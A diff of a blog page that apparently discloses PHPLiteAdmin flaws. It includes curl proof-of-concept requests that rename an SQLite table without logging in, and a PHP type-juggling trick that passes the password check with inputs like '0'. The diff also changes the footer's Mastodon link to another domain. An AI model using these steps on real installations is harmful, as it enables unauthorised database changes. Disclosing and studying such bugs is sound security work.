@@ -139,70 +139,70 @@ An instance of the class Authorization is created. If a POST to index.php
 containts inside the HTTP body the login field and a password, a login
 attempt is made. The if-statementat line 295 checks if the attempt was
 successful.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">//- Check user authentication, login and logout
-</span><span style="color:#75715e"></span>$auth <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Authorization</span>(); <span style="color:#75715e">//create authorization object
-</span><span style="color:#75715e">// check if user has attempted to log out
-</span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;logout&#39;</span>]))
-    $auth<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">revoke</span>();
-<span style="color:#75715e">// check if user has attempted to log in
-</span><span style="color:#75715e"></span><span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;login&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;password&#39;</span>]))
-    $auth<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">attemptGrant</span>($_POST[<span style="color:#e6db74">&#39;password&#39;</span>], <span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;remember&#39;</span>]));
-<span style="color:#75715e">//- Actions on database files and bulk data
-</span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> ($auth<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">isAuthorized</span>())
-{
-</code></pre></div><p>However, scrolling down some lines, we can see that the if-statement ends
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">//- Check user authentication, login and logout
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$auth <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Authorization</span>(); <span style="color:#75715e">//create authorization object
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// check if user has attempted to log out
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;logout&#39;</span>]))
+</span></span><span style="display:flex;"><span>    $auth<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">revoke</span>();
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// check if user has attempted to log in
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;login&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;password&#39;</span>]))
+</span></span><span style="display:flex;"><span>    $auth<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">attemptGrant</span>($_POST[<span style="color:#e6db74">&#39;password&#39;</span>], <span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;remember&#39;</span>]));
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//- Actions on database files and bulk data
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> ($auth<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">isAuthorized</span>())
+</span></span><span style="display:flex;"><span>{
+</span></span></code></pre></div><p>However, scrolling down some lines, we can see that the if-statement ends
 at line 553. That is, everything below can be triggered without
 authorization. Indeed, at line 564 an instance of the Database class is
 created and set to the first database from the configuration file. At line
 572 we can find an if-statement which checks for certain GET parameters.
 Inside the if-statement a switch-statement checks for the values of the
-GET-parameter &lsquo;action&rsquo;. For example, this parameter could be &lsquo;table_drop&rsquo;.
+GET-parameter &lsquo;action&rsquo;. For example, this parameter could be &rsquo;table_drop&rsquo;.
 Checking the code for this case confirms, that it does drop the table which
-is specified by the GET-parameter &lsquo;table&rsquo;.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">}
-<span style="color:#75715e">//- Select database (from session or first available)
-</span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($currentDB) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">count</span>($databases)<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span>)
-{
-    <span style="color:#75715e">//set the current database to the first existing one in the array (default)
-</span><span style="color:#75715e"></span>    $currentDB <span style="color:#f92672">=</span> <span style="color:#a6e22e">reset</span>($databases);
-    $params<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">database</span> <span style="color:#f92672">=</span> $currentDB[<span style="color:#e6db74">&#39;path&#39;</span>]; 
-}
-<span style="color:#75715e">//- Open database (creates a Database object)
-</span><span style="color:#75715e"></span>$db <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Database</span>($currentDB); <span style="color:#75715e">//create the Database object
-</span><span style="color:#75715e"></span>$db<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">registerUserFunction</span>($custom_functions);
-<span style="color:#75715e">// collect parameters early, just once
-</span><span style="color:#75715e"></span>$target_table <span style="color:#f92672">=</span> <span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;table&#39;</span>]) <span style="color:#f92672">?</span> $_GET[<span style="color:#e6db74">&#39;table&#39;</span>] <span style="color:#f92672">:</span> <span style="color:#66d9ef">null</span>;
-$params<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">table</span> <span style="color:#f92672">=</span> $target_table; 
-<span style="color:#75715e">//- Switch on $_GET[&#39;action&#39;] for operations without output
-</span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;action&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;confirm&#39;</span>]))
-{
-    <span style="color:#66d9ef">switch</span>($_GET[<span style="color:#e6db74">&#39;action&#39;</span>])
-    {
-</code></pre></div><p>It seems, we have found the &lsquo;terrible mistake&rsquo;. We can confirm this with a
+is specified by the GET-parameter &rsquo;table&rsquo;.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//- Select database (from session or first available)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($currentDB) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">count</span>($databases)<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//set the current database to the first existing one in the array (default)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    $currentDB <span style="color:#f92672">=</span> <span style="color:#a6e22e">reset</span>($databases);
+</span></span><span style="display:flex;"><span>    $params<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">database</span> <span style="color:#f92672">=</span> $currentDB[<span style="color:#e6db74">&#39;path&#39;</span>]; 
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//- Open database (creates a Database object)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$db <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Database</span>($currentDB); <span style="color:#75715e">//create the Database object
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$db<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">registerUserFunction</span>($custom_functions);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// collect parameters early, just once
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$target_table <span style="color:#f92672">=</span> <span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;table&#39;</span>]) <span style="color:#f92672">?</span> $_GET[<span style="color:#e6db74">&#39;table&#39;</span>] <span style="color:#f92672">:</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>$params<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">table</span> <span style="color:#f92672">=</span> $target_table; 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//- Switch on $_GET[&#39;action&#39;] for operations without output
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;action&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;confirm&#39;</span>]))
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span>($_GET[<span style="color:#e6db74">&#39;action&#39;</span>])
+</span></span><span style="display:flex;"><span>    {
+</span></span></code></pre></div><p>It seems, we have found the &rsquo;terrible mistake&rsquo;. We can confirm this with a
 simple proof-of-concept using curl.</p>
 <p>First, lets create the SQLite file:</p>
 <pre tabindex="0"><code>user@machine: $ sqlite3 database1.sqlite
 ...
 sqlite&gt; create table one(one varchar(1));
-sqlite&gt; insert into one values('a');
+sqlite&gt; insert into one values(&#39;a&#39;);
 sqlite&gt; .dump
 PRAGMA foreign_keys=OFF;
 BEGIN TRANSACTION;
 CREATE TABLE one(one varchar(1));
-INSERT INTO &quot;one&quot; VALUES('a');
+INSERT INTO &#34;one&#34; VALUES(&#39;a&#39;);
 COMMIT;
 sqlite&gt;
-</code></pre><p>To create my proof-of-concept, I will use the action &lsquo;table_rename&rsquo;:</p>
+</code></pre><p>To create my proof-of-concept, I will use the action &rsquo;table_rename&rsquo;:</p>
 <pre tabindex="0"><code>user@machine: $ curl -vv http://localhost/index.php
 ...
 &lt; Set-Cookie: PHPSESSID=fdfgrf2jgu0nsl5scct7mi2ai7; path=/; HttpOnly
 ...
-&lt;input type=&quot;hidden&quot; name=&quot;token&quot; 
-value=&quot;7a06555ab2c9e1ebc56d6498991c218f396b3fbc63a7a1c8704e2667600a72bc&quot; /&gt;
+&lt;input type=&#34;hidden&#34; name=&#34;token&#34; 
+value=&#34;7a06555ab2c9e1ebc56d6498991c218f396b3fbc63a7a1c8704e2667600a72bc&#34; /&gt;
 ...
-user@machine: $ curl -vv -X POST -d &quot;newname=two&amp; \
-token=7a06555ab2c9e1ebc56d6498991c218f396b3fbc63a7a1c8704e2667600a72bc&quot; \
--H &quot;Cookie: PHPSESSID=fdfgrf2jgu0nsl5scct7mi2ai7&quot; \
+user@machine: $ curl -vv -X POST -d &#34;newname=two&amp; \
+token=7a06555ab2c9e1ebc56d6498991c218f396b3fbc63a7a1c8704e2667600a72bc&#34; \
+-H &#34;Cookie: PHPSESSID=fdfgrf2jgu0nsl5scct7mi2ai7&#34; \
 http://localhost/index.php?action=table_rename\&amp;confirm=a\&amp;table=one
 ...
 &gt; POST /index.php?action=table_rename&amp;confirm=a&amp;table=one HTTP/1.1
@@ -213,13 +213,13 @@ http://localhost/index.php?action=table_rename\&amp;confirm=a\&amp;table=one
 ...
 </code></pre><p>First, we do a simple GET to create a session and receiving a CSRF token
 which is needed as we are doing a POST request in the second step. The POST
-request just sends the POST-parameter &lsquo;newname&rsquo; which is used in line 695
+request just sends the POST-parameter &rsquo;newname&rsquo; which is used in line 695
 of index.php to create the query which will rename the table. Moreover, the
 token is sent within the POST-request. That this is necessary is stated
 inside the definition of the Authorization class. The GET-parameters
-contain the &lsquo;action&rsquo;-prameter (&lsquo;table_rename&rsquo;), the &lsquo;contain&rsquo;-parameter
+contain the &lsquo;action&rsquo;-prameter (&rsquo;table_rename&rsquo;), the &lsquo;contain&rsquo;-parameter
 which is needed to get through the if-statement in front of the
-switch-statement, and the &lsquo;table&rsquo;-parameter that states which table
+switch-statement, and the &rsquo;table&rsquo;-parameter that states which table
 should be renamed.</p>
 <p>Indeed, it just worked as expected:</p>
 <pre tabindex="0"><code>user@machine: $ sqlite3 database1.sqlite
@@ -228,7 +228,7 @@ sqlite&gt; .dump
 PRAGMA foreign_keys=OFF;
 BEGIN TRANSACTION;
 CREATE TABLE two(one varchar(1));
-INSERT INTO &quot;two&quot; VALUES('a');
+INSERT INTO &#34;two&#34; VALUES(&#39;a&#39;);
 COMMIT;
 sqlite&gt;	
 </code></pre><p>This was just a small mistake which had a big impact. But as I&rsquo;ve already
@@ -240,25 +240,25 @@ next bug is a zero-day and shows a neat use of type juggling.</p>
 &lsquo;attemptGrant&rsquo; which checks if the user who wants to login does provide the
 correct password. The password is specified in the configuration file. The
 first issue that catches the eye is the first if-statement: The password is
-checked with a &lsquo;=='-comparison insteand of a &lsquo;==='-comparison. Everybody
+checked with a &lsquo;==&rsquo;-comparison insteand of a &lsquo;===&rsquo;-comparison. Everybody
 should know that &lsquo;==&rsquo; is prone to mean type juggling bugs. A nice table
 which can be used as a cheat sheet can be found on the <a href="https://secure.php.net/manual/en/types.comparisons.php">PHP homepage</a></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">attemptGrant</span>($password, $remember)
-{
-	<span style="color:#66d9ef">if</span> ($password <span style="color:#f92672">==</span> <span style="color:#a6e22e">SYSTEMPASSWORD</span>) {
-</code></pre></div><p>However, the password is given to &lsquo;attemptGrant&rsquo; via the $_POST variable,
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">attemptGrant</span>($password, $remember)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> ($password <span style="color:#f92672">==</span> <span style="color:#a6e22e">SYSTEMPASSWORD</span>) {
+</span></span></code></pre></div><p>However, the password is given to &lsquo;attemptGrant&rsquo; via the $_POST variable,
 that is a string is handed over. Just from the table we can see that this
 issue shouldn&rsquo;t be exploitable as the string has to be correct.</p>
 <p>Well, not exactly: As <a href="https://twitter.com/teh_gerg">greg</a> pointed out in <a href="http://gregorkopf.de/slides_berlinsides_2010.pdf">2010</a>, we can make use of
 the scientific notation of powers to exploit this:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">user</span><span style="color:#f92672">@</span><span style="color:#a6e22e">machine</span><span style="color:#f92672">:</span> <span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#a6e22e">php</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">a</span>
-<span style="color:#a6e22e">php</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">var_dump</span>(<span style="color:#ae81ff">0</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;0e1&#39;</span>);
-<span style="color:#a6e22e">bool</span>(<span style="color:#66d9ef">true</span>)
-<span style="color:#a6e22e">php</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">var_dump</span>(<span style="color:#e6db74">&#39;0&#39;</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;0e1&#39;</span>);
-<span style="color:#a6e22e">bool</span>(<span style="color:#66d9ef">true</span>)
-<span style="color:#a6e22e">php</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">var_dump</span>(<span style="color:#e6db74">&#39;200&#39;</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;2e2&#39;</span>);
-<span style="color:#a6e22e">bool</span>(<span style="color:#66d9ef">true</span>)
-</code></pre></div><p>That is, if the password is something like &lsquo;<!-- raw HTML omitted -->e<!-- raw HTML omitted -->&rsquo; the password
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">user</span><span style="color:#f92672">@</span><span style="color:#a6e22e">machine</span><span style="color:#f92672">:</span> <span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#a6e22e">php</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">a</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">php</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">var_dump</span>(<span style="color:#ae81ff">0</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;0e1&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">bool</span>(<span style="color:#66d9ef">true</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">php</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">var_dump</span>(<span style="color:#e6db74">&#39;0&#39;</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;0e1&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">bool</span>(<span style="color:#66d9ef">true</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">php</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">var_dump</span>(<span style="color:#e6db74">&#39;200&#39;</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;2e2&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">bool</span>(<span style="color:#66d9ef">true</span>)
+</span></span></code></pre></div><p>That is, if the password is something like &lsquo;<!-- raw HTML omitted -->e<!-- raw HTML omitted -->&rsquo; the password
 is easier bruteforcable. Moreover, if the first number is a &lsquo;0&rsquo;, just
 typing in a &lsquo;0&rsquo; as the password is enough. It works smoothly :)</p>
 <p>This bug is there since version 1.9.5 which was released in 2014. While
@@ -268,9 +268,9 @@ type juggling.</p>
 <p>PHPLiteAdmin does use htmlentities with ENT_QUOTES to prevent XSS. This is
 maybe not the best sanitization but I couldn&rsquo;t find a case where this could
 lead to XSS. Maybe there are cases in the future.</p>
-<p>The function &lsquo;explode_sql&rsquo; in &lsquo;index.php&rsquo; should behave incorrectly for
+<p>The function &rsquo;explode_sql&rsquo; in &lsquo;index.php&rsquo; should behave incorrectly for
 certain  delimiters. Moreover, there are cases which use user input for the
-call to &lsquo;explode_sql&rsquo;. But I couldn&rsquo;t find cases in which this is
+call to &rsquo;explode_sql&rsquo;. But I couldn&rsquo;t find cases in which this is
 exploitable.</p>
 <p>Thanks to joernchen to bring greg&rsquo;s presentation back to my mind :)</p>
 
@@ -288,7 +288,7 @@ exploitable.</p>
   <footer>
     <div>
       <p class="f6 gray mt6 lh-copy">
-	Contact: mail at kkoenig.net | <a href='https://twitter.com/gr4yf0x'>Twitter</a> | <a rel='me' href='https://infosec.exchange/@gr4yf0x'>Mastodon</a> | <a href='https://github.com/raymontag'>Github</a>
+	Contact: mail at kkoenig.net | <a href='https://twitter.com/gr4yf0x'>Twitter</a> | <a rel='me' href='https://nso.group/@grayfox'>Mastodon</a> | <a href='https://github.com/raymontag'>Github</a>
       </p>
     </div>
   </footer>
